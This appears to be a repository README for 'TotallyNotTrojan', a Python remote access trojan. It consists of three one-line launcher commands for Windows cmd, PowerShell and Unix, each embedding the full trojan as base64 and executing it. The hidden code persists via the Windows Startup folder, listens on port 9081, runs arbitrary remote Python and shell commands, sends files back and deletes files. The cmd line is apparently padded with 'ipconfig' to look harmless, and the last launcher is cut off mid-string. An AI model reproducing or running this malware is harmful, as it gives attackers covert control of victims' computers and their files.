# TotallyNotTrojan
TotallyNotTrojan is a RAT written on Python. Works mostly with Windows PCs, but Client-side works also with *nix-systems.

# Cmd start
```
echo import base64;exec(base64.b64decode('aW1wb3J0IHNvY2tldCwgb3MsIHRpbWUsIGN0eXBlcwpmcm9tIHJhbmRvbSBpbXBvcnQgcmFuZGludDtWRVJTSU9OID0gIkJVSUxEIDE0MjUuTk9VUEQgKEVuY29kZWQgaW4gQjY0KSIKc29jayA9IHNvY2tldC5zb2NrZXQoKTtzb2NrLmJpbmQoKCIiLCA5MDgxKSk7c29jay5saXN0ZW4oMTApCmltcG9ydCBzeXMsIGdldHBhc3MKYm9vdCA9ICJDOi9Vc2Vycy8iK2dldHBhc3MuZ2V0dXNlcigpKyIvQXBwRGF0YS9Sb2FtaW5nL01pY3Jvc29mdC9XaW5kb3dzL1N0YXJ0IE1lbnUvUHJvZ3JhbXMvU3RhcnR1cC9Ub3RhbGx5Tm90VHJvamFuLnB5dyIKaWYgc3lzLmFyZ3ZbMF0gIT0gYm9vdDoKICAgIHRyeToKICAgICAgICBpbXBvcnQgc2h1dGlsCiAgICAgICAgc2h1dGlsLmNvcHlmaWxlKHN5cy5hcmd2WzBdLCBib290KQogICAgICAgIG9zLnJlbW92ZShzeXMuYXJndlswXSkKICAgIGV4Y2VwdDoKICAgICAgICBwYXNzCmRlZiB1cHRvZGF0ZSgpOgogICAgZGF0YSA9IGNvbm4ucmVjdigxMDAwMDAwKS5kZWNvZGUoInV0Zi04IikKICAgIHdpdGggb3BlbigiVG90YWxseU5vdFRyb2phbi5weXciLCAidyIpIGFzIGY6CiAgICAgICAgZi53cml0ZShkYXRhKQogICAgICAgIGYuY2xvc2UoKQpkZWYgc2VsZnRlc3QoKTpjb25uLnNlbmQoVkVSU0lPTi5lbmNvZGUoInV0Zi04IikpCmRlZiBleGVjcHkoKTpleGVjKHB5Y29tbSkKZGVmIHRhbGsoKToKICAgIHRyeToKICAgICAgICB0YWxrZmlsZSA9IG9wZW4oIjEudmJzIiwgInciKQogICAgICAgIHRhbGtmaWxlLndyaXRlKCJzZXQgc2FwaT1DcmVhdGVPYmplY3QoXCJzYXBpLnNwdm9pY2VcIikgXG4gc2FwaS5zcGVhayBcIiIrdGV4dHRvdGFsaysiXCIiKQogICAgICAgIHRhbGtmaWxlLmNsb3NlKCkKICAgICAgICBvcy5zeXN0ZW0oInN0YXJ0IDEudmJzIik7dGltZS5zbGVlcCgxKTtvcy5zeXN0ZW0oImRlbCAxLnZicyIpCiAgICBleGNlcHQ6cGFzcwpkZWYgbWVzcygpOmN0eXBlcy53aW5kbGwudXNlcjMyLk1lc3NhZ2VCb3hXKDAsIG1lc3NhZ2UsIHRpdGxlLCAwKQpkZWYgbmljZSgpOgogICAgdHJ5OgogICAgICAgIGQgPSByYW5kaW50KDEsIDQpCiAgICAgICAgaWYgZCA9PSAxOm9zLnN5c3RlbSgiQzovV2luZG93cy9TeXN0ZW0zMi9SaWJib25zLnNjciAtcyIpCiAgICAgICAgaWYgZCA9PSAyOm9zLnN5c3RlbSgiQzovV2luZG93cy9TeXN0ZW0zMi9CdWJibGVzLnNjciAtcyIpCiAgICAgICAgaWYgZCA9PSAzOm9zLnN5c3RlbSgiQzovV2luZG93cy9TeXN0ZW0zMi9NeXN0aWZ5LnNjciAtcyIpCiAgICAgICAgaWYgZCA9PSA0Om9zLnN5c3RlbSgiQzovV2luZG93cy9TeXN0ZW0zMi9zc1RleHQzZC5zY3IgLXMiKQogICAgZXhjZXB0OnBhc3MKZGVmIGRpcmVjdG9yeSgpOgogICAgdHJ5Om9zLm1rZGlyKGZvbGRlcnRvY3JlYXRlZGVjKQogICAgZXhjZXB0OnBhc3MKZGVmIGNkam9rZSgpOgogICAgdHJ5OgogICAgICAgIHRhbGtmaWxlID0gb3BlbigiMS52YnMiLCAidyIpCiAgICAgICAgdGFsa2ZpbGUud3JpdGUoIlNldCBvYmpXTVAgPSBDcmVhdGVPYmplY3QoXCJXTVBsYXllci5PQ1guN1wiKVxuU2V0IGNvbENEcyA9IG9ialdNUC5jZHJvbUNvbGxlY3Rpb25cbmNvbENEcy5JdGVtKDApLkVqZWN0XG5Nc2dCb3ggXCJQcmVzcyBhbnkga2V5IHRvIGNsb3NlIENEXCIsNjQsXCJPcGVuIENsb3NlIENkIFRyYXlcIlxuY29sQ0RzLkl0ZW0oMCkuRWplY3QiKQogICAgICAgIHRhbGtmaWxlLmNsb3NlKCkKICAgICAgICBvcy5zeXN0ZW0oInN0YXJ0IDEudmJzIik7dGltZS5zbGVlcCgxKTtvcy5zeXN0ZW0oImRlbCAxLnZicyIpCiAgICBleGNlcHQ6cGFzcwpkZWYgZnVuKCk6b3MucG9wZW4oImV4cGxvcmVyIGh0dHBzOi8veW91dHViZS5jb20iKQpkZWYgZmlsZXMoKToKICAgIHRyeToKICAgICAgICBmaWxlcyA9IG9wZW4oYWJvdXRmaWxlLCAidyIpCiAgICAgICAgZmlsZXMud3JpdGUoZmlsZWRhdGFkZWMpCiAgICAgICAgZmlsZXMuY2xvc2UoKQogICAgZXhjZXB0OnBhc3MKZGVmIHByb21wdChhcmcpOm9zLnBvcGVuKGFyZykKZGVmIHJlbW92ZWZsZCgpOgogICAgdHJ5Om9zLnJtZGlyKGZvbGR0b3JlbWRlYykKICAgIGV4Y2VwdCBGaWxlTm90Rm91bmRFcnJvcjpwYXNzCmRlZiByZW1vdmUoKToKICAgIHRyeTpvcy5yZW1vdmUoZmlsZXRvcmVtZGVjKQogICAgZXhjZXB0IEZpbGVOb3RGb3VuZEVycm9yOnBhc3MKZGVmIGxzKCk6CiAgICB0cnk6CiAgICAgICAgcGF0aCA9IGNvbm4ucmVjdigxMDAwNSkuZGVjb2RlKCJ1dGYtOCIpCiAgICAgICAgaWYgcGF0aCAhPSBOb25lIGFuZCBwYXRoICE9ICIiOgogICAgICAgICAgICBmbHNmID0gb3MubGlzdGRpcihwYXRoKQogICAgICAgICAgICBmbHMgPSBzdHIoZmxzZi5lbmNvZGUoInV0Zi04IikpCiAgICAgICAgICAgIGNvbm4uc2VuZChmbHMpCiAgICBleGNlcHQgRmlsZU5vdEZvdW5kRXJyb3I6IHBhc3MKZGVmIGNhdChmbCk6CiAgICB3aXRoIG9wZW4oZmwsICJyYiIpIGFzIGY6CiAgICAgICAgY29ubi5zZW5kKGYucmVhZCgpKQogICAgICAgIGYuY2xvc2UoKQp3aGlsZSBUcnVlOgogICAgY29ubiwgYWRkciA9IHNvY2suYWNjZXB0KCkKICAgIGRhdGEgPSBjb25uLnJlY3YoMTYzODQpCiAgICB1ZGF0YSA9IGRhdGEuZGVjb2RlKCJ1dGYtOCIpCiAgICBpZiB1ZGF0YSA9PSAidXBkYXRlIjp1cHRvZGF0ZSgpCiAgICBpZiB1ZGF0YSA9PSAiZXhlY3B5IjoKICAgICAgICBweWNvbW1mID0gY29ubi5yZWN2KDE2Mzg0KQogICAgICAgIHB5Y29tbSA9IHB5Y29tbWYuZGVjb2RlKCJ1dGYtOCIpCiAgICAgICAgZXhlY3B5KCkKICAgIGlmIHVkYXRhID09ICJmdW4iOmZ1bigpCiAgICBpZiB1ZGF0YSA9PSAibmljZSI6bmljZSgpCiAgICBpZiB1ZGF0YSA9PSAibWtkaXIiOgogICAgICAgIGZvbGRlcnRvY3JlYXRlID0gY29ubi5yZWN2KDE2Mzg0KQogICAgICAgIGZvbGRlcnRvY3JlYXRlZGVjID0gZm9sZGVydG9jcmVhdGUuZGVjb2RlKCJ1dGYtOCIpCiAgICAgICAgZGlyZWN0b3J5KCkKICAgIGlmIHVkYXRhID09ICJmaWxlIjoKICAgICAgICBhYm91dGZpbGUgPSBjb25uLnJlY3YoMTYzODQpCiAgICAgICAgZmlsZWRhdGEgPSBjb25uLnJlY3YoMTYzODQpCiAgICAgICAgZmlsZWRhdGFkZWMgPSBmaWxlZGF0YS5kZWNvZGUoInV0Zi04IikKICAgICAgICBmaWxlcygpCiAgICBpZiB1ZGF0YSA9PSAicm1kaXIiOgogICAgICAgIGZvbGR0b3JlbSA9IGNvbm4ucmVjdigxNjM4NCkKICAgICAgICBmb2xkdG9yZW1kZWMgPSBmb2xkdG9yZW0uZGVjb2RlKCJ1dGYtOCIpCiAgICAgICAgcmVtb3ZlZmxkKCkKICAgIGlmIHVkYXRhID09ICJybSI6CiAgICAgICAgZmlsZXRvcmVtID0gY29ubi5yZWN2KDE2Mzg0KQogICAgICAgIGZpbGV0b3JlbWRlYyA9IGZpbGV0b3JlbS5kZWNvZGUoInV0Zi04IikKICAgICAgICByZW1vdmUoKQogICAgaWYgdWRhdGEgPT0gIm1lc3NhZ2UiOgogICAgICAgIG1lc3NhZ2VmID0gY29ubi5yZWN2KDE2MDApCiAgICAgICAgdGl0bGVmID0gY29ubi5yZWN2KDE2MDApCiAgICAgICAgbWVzc2FnZSA9IG1lc3NhZ2VmLmRlY29kZSgidXRmLTgiKQogICAgICAgIHRpdGxlID0gdGl0bGVmLmRlY29kZSgidXRmLTgiKQogICAgICAgIG1lc3MoKQogICAgaWYgdWRhdGEgPT0gInRhbGsiOgogICAgICAgIHRleHR0b3RhbGtmID0gY29ubi5yZWN2KDE2MDApCiAgICAgICAgdGV4dHRvdGFsayA9IHRleHR0b3RhbGtmLmRlY29kZSgidXRmLTgiKQogICAgICAgIHRhbGsoKQogICAgaWYgdWRhdGEgPT0gImxzIjpscygpCiAgICBpZiB1ZGF0YSA9PSAic2VsZnRlc3QiOnNlbGZ0ZXN0KCkKICAgIGlmIHVkYXRhID09ICJzaGVsbCI6cHJvbXB0KGNvbm4ucmVjdigxNjM4NCkuZGVjb2RlKCJ1dGYtOCIpKQogICAgaWYgdWRhdGEgPT0gImNkam9rZSI6Y2Rqb2tlKCkKICAgIGlmIHVkYXRhID09ICJjYXQiOgogICAgICAgIGNhdChjb25uLnJlY3YoMTYzODQpLmRlY29kZSgidXRmLTgiKSkKICAgIGVsc2U6cGFzcztjb25uLmNsb3NlKCk=')) > tnt.pyw && pythonw tnt.pyw && cls && ipconfig
```
# Powershell startup
```
cmd /c "echo import base64;exec(base64.b64decode('aW1wb3J0IHNvY2tldCwgb3MsIHRpbWUsIGN0eXBlcwpmcm9tIHJhbmRvbSBpbXBvcnQgcmFuZGludDtWRVJTSU9OID0gIkJVSUxEIDE0MjUuTk9VUEQgKEVuY29kZWQgaW4gQjY0KSIKc29jayA9IHNvY2tldC5zb2NrZXQoKTtzb2NrLmJpbmQoKCIiLCA5MDgxKSk7c29jay5saXN0ZW4oMTApCmltcG9ydCBzeXMsIGdldHBhc3MKYm9vdCA9ICJDOi9Vc2Vycy8iK2dldHBhc3MuZ2V0dXNlcigpKyIvQXBwRGF0YS9Sb2FtaW5nL01pY3Jvc29mdC9XaW5kb3dzL1N0YXJ0IE1lbnUvUHJvZ3JhbXMvU3RhcnR1cC9Ub3RhbGx5Tm90VHJvamFuLnB5dyIKaWYgc3lzLmFyZ3ZbMF0gIT0gYm9vdDoKICAgIHRyeToKICAgICAgICBpbXBvcnQgc2h1dGlsCiAgICAgICAgc2h1dGlsLmNvcHlmaWxlKHN5cy5hcmd2WzBdLCBib290KQogICAgICAgIG9zLnJlbW92ZShzeXMuYXJndlswXSkKICAgIGV4Y2VwdDoKICAgICAgICBwYXNzCmRlZiB1cHRvZGF0ZSgpOgogICAgZGF0YSA9IGNvbm4ucmVjdigxMDAwMDAwKS5kZWNvZGUoInV0Zi04IikKICAgIHdpdGggb3BlbigiVG90YWxseU5vdFRyb2phbi5weXciLCAidyIpIGFzIGY6CiAgICAgICAgZi53cml0ZShkYXRhKQogICAgICAgIGYuY2xvc2UoKQpkZWYgc2VsZnRlc3QoKTpjb25uLnNlbmQoVkVSU0lPTi5lbmNvZGUoInV0Zi04IikpCmRlZiBleGVjcHkoKTpleGVjKHB5Y29tbSkKZGVmIHRhbGsoKToKICAgIHRyeToKICAgICAgICB0YWxrZmlsZSA9IG9wZW4oIjEudmJzIiwgInciKQogICAgICAgIHRhbGtmaWxlLndyaXRlKCJzZXQgc2FwaT1DcmVhdGVPYmplY3QoXCJzYXBpLnNwdm9pY2VcIikgXG4gc2FwaS5zcGVhayBcIiIrdGV4dHRvdGFsaysiXCIiKQogICAgICAgIHRhbGtmaWxlLmNsb3NlKCkKICAgICAgICBvcy5zeXN0ZW0oInN0YXJ0IDEudmJzIik7dGltZS5zbGVlcCgxKTtvcy5zeXN0ZW0oImRlbCAxLnZicyIpCiAgICBleGNlcHQ6cGFzcwpkZWYgbWVzcygpOmN0eXBlcy53aW5kbGwudXNlcjMyLk1lc3NhZ2VCb3hXKDAsIG1lc3NhZ2UsIHRpdGxlLCAwKQpkZWYgbmljZSgpOgogICAgdHJ5OgogICAgICAgIGQgPSByYW5kaW50KDEsIDQpCiAgICAgICAgaWYgZCA9PSAxOm9zLnN5c3RlbSgiQzovV2luZG93cy9TeXN0ZW0zMi9SaWJib25zLnNjciAtcyIpCiAgICAgICAgaWYgZCA9PSAyOm9zLnN5c3RlbSgiQzovV2luZG93cy9TeXN0ZW0zMi9CdWJibGVzLnNjciAtcyIpCiAgICAgICAgaWYgZCA9PSAzOm9zLnN5c3RlbSgiQzovV2luZG93cy9TeXN0ZW0zMi9NeXN0aWZ5LnNjciAtcyIpCiAgICAgICAgaWYgZCA9PSA0Om9zLnN5c3RlbSgiQzovV2luZG93cy9TeXN0ZW0zMi9zc1RleHQzZC5zY3IgLXMiKQogICAgZXhjZXB0OnBhc3MKZGVmIGRpcmVjdG9yeSgpOgogICAgdHJ5Om9zLm1rZGlyKGZvbGRlcnRvY3JlYXRlZGVjKQogICAgZXhjZXB0OnBhc3MKZGVmIGNkam9rZSgpOgogICAgdHJ5OgogICAgICAgIHRhbGtmaWxlID0gb3BlbigiMS52YnMiLCAidyIpCiAgICAgICAgdGFsa2ZpbGUud3JpdGUoIlNldCBvYmpXTVAgPSBDcmVhdGVPYmplY3QoXCJXTVBsYXllci5PQ1guN1wiKVxuU2V0IGNvbENEcyA9IG9ialdNUC5jZHJvbUNvbGxlY3Rpb25cbmNvbENEcy5JdGVtKDApLkVqZWN0XG5Nc2dCb3ggXCJQcmVzcyBhbnkga2V5IHRvIGNsb3NlIENEXCIsNjQsXCJPcGVuIENsb3NlIENkIFRyYXlcIlxuY29sQ0RzLkl0ZW0oMCkuRWplY3QiKQogICAgICAgIHRhbGtmaWxlLmNsb3NlKCkKICAgICAgICBvcy5zeXN0ZW0oInN0YXJ0IDEudmJzIik7dGltZS5zbGVlcCgxKTtvcy5zeXN0ZW0oImRlbCAxLnZicyIpCiAgICBleGNlcHQ6cGFzcwpkZWYgZnVuKCk6b3MucG9wZW4oImV4cGxvcmVyIGh0dHBzOi8veW91dHViZS5jb20iKQpkZWYgZmlsZXMoKToKICAgIHRyeToKICAgICAgICBmaWxlcyA9IG9wZW4oYWJvdXRmaWxlLCAidyIpCiAgICAgICAgZmlsZXMud3JpdGUoZmlsZWRhdGFkZWMpCiAgICAgICAgZmlsZXMuY2xvc2UoKQogICAgZXhjZXB0OnBhc3MKZGVmIHByb21wdChhcmcpOm9zLnBvcGVuKGFyZykKZGVmIHJlbW92ZWZsZCgpOgogICAgdHJ5Om9zLnJtZGlyKGZvbGR0b3JlbWRlYykKICAgIGV4Y2VwdCBGaWxlTm90Rm91bmRFcnJvcjpwYXNzCmRlZiByZW1vdmUoKToKICAgIHRyeTpvcy5yZW1vdmUoZmlsZXRvcmVtZGVjKQogICAgZXhjZXB0IEZpbGVOb3RGb3VuZEVycm9yOnBhc3MKZGVmIGxzKCk6CiAgICB0cnk6CiAgICAgICAgcGF0aCA9IGNvbm4ucmVjdigxMDAwNSkuZGVjb2RlKCJ1dGYtOCIpCiAgICAgICAgaWYgcGF0aCAhPSBOb25lIGFuZCBwYXRoICE9ICIiOgogICAgICAgICAgICBmbHNmID0gb3MubGlzdGRpcihwYXRoKQogICAgICAgICAgICBmbHMgPSBzdHIoZmxzZi5lbmNvZGUoInV0Zi04IikpCiAgICAgICAgICAgIGNvbm4uc2VuZChmbHMpCiAgICBleGNlcHQgRmlsZU5vdEZvdW5kRXJyb3I6IHBhc3MKZGVmIGNhdChmbCk6CiAgICB3aXRoIG9wZW4oZmwsICJyYiIpIGFzIGY6CiAgICAgICAgY29ubi5zZW5kKGYucmVhZCgpKQogICAgICAgIGYuY2xvc2UoKQp3aGlsZSBUcnVlOgogICAgY29ubiwgYWRkciA9IHNvY2suYWNjZXB0KCkKICAgIGRhdGEgPSBjb25uLnJlY3YoMTYzODQpCiAgICB1ZGF0YSA9IGRhdGEuZGVjb2RlKCJ1dGYtOCIpCiAgICBpZiB1ZGF0YSA9PSAidXBkYXRlIjp1cHRvZGF0ZSgpCiAgICBpZiB1ZGF0YSA9PSAiZXhlY3B5IjoKICAgICAgICBweWNvbW1mID0gY29ubi5yZWN2KDE2Mzg0KQogICAgICAgIHB5Y29tbSA9IHB5Y29tbWYuZGVjb2RlKCJ1dGYtOCIpCiAgICAgICAgZXhlY3B5KCkKICAgIGlmIHVkYXRhID09ICJmdW4iOmZ1bigpCiAgICBpZiB1ZGF0YSA9PSAibmljZSI6bmljZSgpCiAgICBpZiB1ZGF0YSA9PSAibWtkaXIiOgogICAgICAgIGZvbGRlcnRvY3JlYXRlID0gY29ubi5yZWN2KDE2Mzg0KQogICAgICAgIGZvbGRlcnRvY3JlYXRlZGVjID0gZm9sZGVydG9jcmVhdGUuZGVjb2RlKCJ1dGYtOCIpCiAgICAgICAgZGlyZWN0b3J5KCkKICAgIGlmIHVkYXRhID09ICJmaWxlIjoKICAgICAgICBhYm91dGZpbGUgPSBjb25uLnJlY3YoMTYzODQpCiAgICAgICAgZmlsZWRhdGEgPSBjb25uLnJlY3YoMTYzODQpCiAgICAgICAgZmlsZWRhdGFkZWMgPSBmaWxlZGF0YS5kZWNvZGUoInV0Zi04IikKICAgICAgICBmaWxlcygpCiAgICBpZiB1ZGF0YSA9PSAicm1kaXIiOgogICAgICAgIGZvbGR0b3JlbSA9IGNvbm4ucmVjdigxNjM4NCkKICAgICAgICBmb2xkdG9yZW1kZWMgPSBmb2xkdG9yZW0uZGVjb2RlKCJ1dGYtOCIpCiAgICAgICAgcmVtb3ZlZmxkKCkKICAgIGlmIHVkYXRhID09ICJybSI6CiAgICAgICAgZmlsZXRvcmVtID0gY29ubi5yZWN2KDE2Mzg0KQogICAgICAgIGZpbGV0b3JlbWRlYyA9IGZpbGV0b3JlbS5kZWNvZGUoInV0Zi04IikKICAgICAgICByZW1vdmUoKQogICAgaWYgdWRhdGEgPT0gIm1lc3NhZ2UiOgogICAgICAgIG1lc3NhZ2VmID0gY29ubi5yZWN2KDE2MDApCiAgICAgICAgdGl0bGVmID0gY29ubi5yZWN2KDE2MDApCiAgICAgICAgbWVzc2FnZSA9IG1lc3NhZ2VmLmRlY29kZSgidXRmLTgiKQogICAgICAgIHRpdGxlID0gdGl0bGVmLmRlY29kZSgidXRmLTgiKQogICAgICAgIG1lc3MoKQogICAgaWYgdWRhdGEgPT0gInRhbGsiOgogICAgICAgIHRleHR0b3RhbGtmID0gY29ubi5yZWN2KDE2MDApCiAgICAgICAgdGV4dHRvdGFsayA9IHRleHR0b3RhbGtmLmRlY29kZSgidXRmLTgiKQogICAgICAgIHRhbGsoKQogICAgaWYgdWRhdGEgPT0gImxzIjpscygpCiAgICBpZiB1ZGF0YSA9PSAic2VsZnRlc3QiOnNlbGZ0ZXN0KCkKICAgIGlmIHVkYXRhID09ICJzaGVsbCI6cHJvbXB0KGNvbm4ucmVjdigxNjM4NCkuZGVjb2RlKCJ1dGYtOCIpKQogICAgaWYgdWRhdGEgPT0gImNkam9rZSI6Y2Rqb2tlKCkKICAgIGlmIHVkYXRhID09ICJjYXQiOgogICAgICAgIGNhdChjb25uLnJlY3YoMTYzODQpLmRlY29kZSgidXRmLTgiKSkKICAgIGVsc2U6cGFzcztjb25uLmNsb3NlKCk=')) > tnt.pyw && pythonw tnt.pyw && exit"; exit
```
# *-nix startup
```
python3 -c "import base64;exec(base64.b64decode('aW1wb3J0IHNvY2tldCwgb3MsIHRpbWUsIGN0eXBlcwpmcm9tIHJhbmRvbSBpbXBvcnQgcmFuZGludDtWRVJTSU9OID0gIkJVSUxEIDE0MjUuTk9VUEQgKEVuY29kZWQgaW4gQjY0KSIKc29jayA9IHNvY2tldC5zb2NrZXQoKTtzb2NrLmJpbmQoKCIiLCA5MDgxKSk7c29jay5saXN0ZW4oMTApCmltcG9ydCBzeXMsIGdldHBhc3MKYm9vdCA9ICJDOi9Vc2Vycy8iK2dldHBhc3MuZ2V0dXNlcigpKyIvQXBwRGF0YS9Sb2FtaW5nL01pY3Jvc29mdC9XaW5kb3dzL1N0YXJ0IE1lbnUvUHJvZ3JhbXMvU3RhcnR1cC9Ub3RhbGx5Tm90VHJvamFuLnB5dyIKaWYgc3lzLmFyZ3ZbMF0gIT0gYm9vdDoKICAgIHRyeToKICAgICAgICBpbXBvcnQgc2h1dGlsCiAgICAgICAgc2h1dGlsLmNvcHlmaWxlKHN5cy5hcmd2WzBdLCBib290KQogICAgICAgIG9zLnJlbW92ZShzeXMuYXJndlswXSkKICAgIGV4Y2VwdDoKICAgICAgICBwYXNzCmRlZiB1cHRvZGF0ZSgpOgogICAgZGF0YSA9IGNvbm4ucmVjdigxMDAwMDAwKS5kZWNvZGUoInV0Zi04IikKICAgIHdpdGggb3BlbigiVG90YWxseU5vdFRyb2phbi5weXciLCAidyIpIGFzIGY6CiAgICAgICAgZi53cml0ZShkYXRhKQogICAgICAgIGYuY2xvc2UoKQpkZWYgc2VsZnRlc3QoKTpjb25uLnNlbmQoVkVSU0lPTi5lbmNvZGUoInV0Zi04IikpCmRlZiBleGVjcHkoKTpleGVjKHB5Y29tbSkKZGVmIHRhbGsoKToKICAgIHRyeToKICAgICAgICB0YWxrZmlsZSA9IG9wZW4oIjEudmJzIiwgInciKQogICAgICAgIHRhbGtmaWxlLndyaXRlKCJzZXQgc2FwaT1DcmVhdGVPYmplY3QoXCJzYXBpLnNwdm9pY2VcIikgXG4gc2FwaS5zcGVhayBcIiIrdGV4dHRvdGFsaysiXCIiKQogICAgICAgIHRhbGtmaWxlLmNsb3NlKCkKICAgICAgICBvcy5zeXN0ZW0oInN0YXJ0IDEudmJzIik7dGltZS5zbGVlcCgxKTtvcy5zeXN0ZW0oImRlbCAxLnZicyIpCiAgICBleGNlcHQ6cGFzcwpkZWYgbWVzcygpOmN0eXBlcy53aW5kbGwudXNlcjMyLk1lc3NhZ2VCb3hXKDAsIG1lc3NhZ2UsIHRpdGxlLCAwKQpkZWYgbmljZSgpOgogICAgdHJ5OgogICAgICAgIGQgPSByYW5kaW50KDEsIDQpCiAgICAgICAgaWYgZCA9PSAxOm9zLnN5c3RlbSgiQzovV2luZG93cy9TeXN0ZW0zMi9SaWJib25zLnNjciAtcyIpCiAgICAgICAgaWYgZCA9PSAyOm9zLnN5c3RlbSgiQzovV2luZG93cy9TeXN0ZW0zMi9CdWJibGVzLnNjciAtcyIpCiAgICAgICAgaWYgZCA9PSAzOm9zLnN5c3RlbSgiQzovV2luZG93cy9TeXN0ZW0zMi9NeXN0aWZ5LnNjciAtcyIpCiAgICAgICAgaWYgZCA9PSA0Om9zLnN5c3RlbSgiQzovV2luZG93cy9TeXN0ZW0zMi9zc1RleHQzZC5zY3IgLXMiKQogICAgZXhjZXB0OnBhc3MKZGVmIGRpcmVjdG9yeSgpOgogICAgdHJ5Om9zLm1rZGlyKGZvbGRlcnRvY3JlYXRlZGVjKQogICAgZXhjZXB0OnBhc3MKZGVmIGNkam9rZSgpOgogICAgdHJ5OgogICAgICAgIHRhbGtmaWxlID0gb3BlbigiMS52YnMiLCAidyIpCiAgICAgICAgdGFsa2ZpbGUud3JpdGUoIlNldCBvYmpXTVAgPSBDcmVhdGVPYmplY3QoXCJXTVBsYXllci5PQ1guN1wiKVxuU2V0IGNvbENEcyA9IG9ialdNUC5jZHJvbUNvbGxlY3Rpb25cbmNvbENEcy5JdGVtKDApLkVqZWN0XG5Nc2dCb3ggXCJQcmVzcyBhbnkga2V5IHRvIGNsb3NlIENEXCIsNjQsXCJPcGVuIENsb3NlIENkIFRyYXlcIlxuY29sQ0RzLkl0ZW0oMCkuRWplY3QiKQogICAgICAgIHRhbGtmaWxlLmNsb3NlKCkKICAgICAgICBvcy5zeXN0ZW0oInN0YXJ0IDEudmJzIik7dGltZS5zbGVlcCgxKTtvcy5zeXN0ZW0oImRlbCAxLnZicyIpCiAgICBleGNlcHQ6cGFzcwpkZWYgZnVuKCk6b3MucG9wZW4oImV4cGxvcmVyIGh0dHBzOi8veW91dHViZS5jb20iKQpkZWYgZmlsZXMoKToKICAgIHRyeToKICAgICAgICBmaWxlcyA9IG9wZW4oYWJvdXRmaWxlLCAidyIpCiAgICAgICAgZmlsZXMud3JpdGUoZmlsZWRhdGFkZWMpCiAgICAgICAgZmlsZXMuY2xvc2UoKQogICAgZXhjZXB0OnBhc3MKZGVmIHByb21wdChhcmcpOm9zLnBvcGVuKGFyZykKZGVmIHJlbW92ZWZsZCgpOgogICAgdHJ5Om9zLnJtZGlyKGZvbGR0b3JlbWRlYykKICAgIGV4Y2VwdCBGaWxlTm90Rm91bmRFcnJvcjpwYXNzCmRlZiByZW1vdmUoKToKICAgIHRyeTpvcy5yZW1vdmUoZmlsZXRvcmVtZGVjKQogICAgZXhjZXB0IEZpbGVOb3RGb3VuZEVycm9yOnBhc3MKZGVmIGxzKCk6CiAgICB0cnk6CiAgICAgICAgcGF0aCA9IGNvbm4ucmVjdigxMDAwNSkuZGVjb2RlKCJ1dGYtOCIpCiAgICAgICAgaWYgcGF0aCAhPSBOb25lIGFuZCBwYXRoICE9ICIiOgogICAgICAgICAgICBmbHNmID0gb3MubGlzdGRpcihwYXRoKQogICAgICAgICAgICBmbHMgPSBzdHIoZmxzZi5lbmNvZGUoInV0Zi04IikpCiAgICAgICAgICAgIGNvbm4uc2VuZChmbHMpCiAgICBleGNlcHQgRmlsZU5vdEZvdW5kRXJyb3I6IHBhc3MKZGVmIGNhdChmbCk6CiAgICB3aXRoIG9wZW4oZmwsICJyYiIpIGFzIGY6CiAgICAgICAgY29ubi5zZW5kKGYucmVhZCgpKQogICAgICAgIGYuY2xvc2UoKQp3aGlsZSBUcnVlOgogICAgY29ubiwgYWRkciA9IHNvY2suYWNjZXB0KCkKICAgIGRhdGEgPSBjb25uLnJlY3YoMTYzODQpCiAgICB1ZGF0YSA9IGRhdGEuZGVjb2RlKCJ1dGYtOCIpCiAgICBpZiB1ZGF0YSA9PSAidXBkYXRlIjp1cHRvZGF0ZSgpCiAgICBpZiB1ZGF0YSA9PSAiZXhlY3B5IjoKICAgICAgICBweWNvbW1mID0gY29ubi5yZWN2KDE2Mzg0KQogICAgICAgIHB5Y29tbSA9IHB5Y29tbWYuZGVjb2RlKCJ1dGYtOCIpCiAgICAgICAgZXhlY3B5KCkKICAgIGlmIHVkYXRhID09ICJmdW4iOmZ1bigpCiAgICBpZiB1ZGF0YSA9PSAibmljZSI6bmljZSgpCiAgICBpZiB1ZGF0YSA9PSAibWtkaXIiOgogICAgICAgIGZvbGRlcnRvY3JlYXRlID0gY29ubi5yZWN2KDE2Mzg0KQogICAgICAgIGZvbGRlcnRvY3JlYXRlZGVjID0gZm9sZGVydG9jcmVhdGUuZGVjb2RlKCJ1dGYtOCIpCiAgICAgICAgZGlyZWN0b3J5KCkKICAgIGlmIHVkYXRhID09ICJmaWxlIjoKICAgICAgICBhYm91dGZpbGUgPSBjb25uLnJlY3YoMTYzODQpCiAgICAgICAgZmlsZWRhdGEgPSBjb25uLnJlY3YoMTYzODQpCiAgICAgICAgZmlsZWRhdGFkZWMgPSBmaWxlZGF0YS5kZWNvZGUoInV0Zi04IikKICAgICAgICBmaWxlcygpCiAgICBpZiB1ZGF0YSA9PSAicm1kaXIiOgogICAgICAgIGZvbGR0b3JlbSA9IGNvbm4ucmVjdigxNjM4NCkKICAgICAgICBmb2xkdG9yZW1kZWMgPSBmb2xkdG9yZW0uZGVjb2RlKCJ1dGYtOCIpCiAgICAgICAgcmVtb3ZlZmxkKCkKICAgIGlmIHVkYXRhID09ICJybSI6CiAgICAgICAgZmlsZXRvcmVtID0gY29ubi5yZWN2KDE2Mzg0KQogICAgICAgIGZpbGV0b3JlbWRlYyA9IGZpbGV0b3JlbS5kZWNvZGUoInV0Zi04IikKICAgICAgICByZW1vdmUoKQogICAgaWYgdWRhdGEgPT0gIm1lc3NhZ2UiOgogICAgICAgIG1lc3NhZ2VmID0gY29ubi5yZWN2KDE2MDApCiAgICAgICAgdGl0bGVmID0gY29ubi5yZWN2KDE2MDApCiAgICAgICAgbWVzc2FnZSA9IG1lc3NhZ2VmLmRlY29kZSgidXRmLTgiKQogICAgICAgIHRpdGxlID0gdGl0bGVmLmRlY29kZSgidXRmLTgiKQogICAgICAgIG1lc3MoKQogICAgaWYgdWRhdGEgPT0gInRhbGsiOgogICAgICAgIHRleHR0b3RhbGtmID0gY29ubi5yZWN2KDE2MDApCiAgICAgICAgdGV4dHRvdGFsayA9IHRleHR0b3RhbGtmLmRlY29kZSgidXRmLTgiKQogICAgICAgIHRhbGsoKQogICAgaWYgdWRhdGEgPT0gImxzIjpscygpCiAgICBpZiB1ZGF0YSA9PSAic2VsZnRlc3QiOnNlbGZ0ZXN0KCkKICAgIGlmIHVkYXRhID09ICJzaGVsbCI6cHJvbXB0KGNvbm4ucmVjdigxNjM4NCkuZGVjb2RlKCJ1dGYtOCIpKQogICAgaWYgdWRhdGEgPT0gImNkam9rZSI6Y2Rqb2tlKCkKICAgIGlmIHVkYXRhID09ICJjYXQiOgogICAgICAgIGNhdChjb25uLnJlY3YoMTYzODQpLmRlY29kZ